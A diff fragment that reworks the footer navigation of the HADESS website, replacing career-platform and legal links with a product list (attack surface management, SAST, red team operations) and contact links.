+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
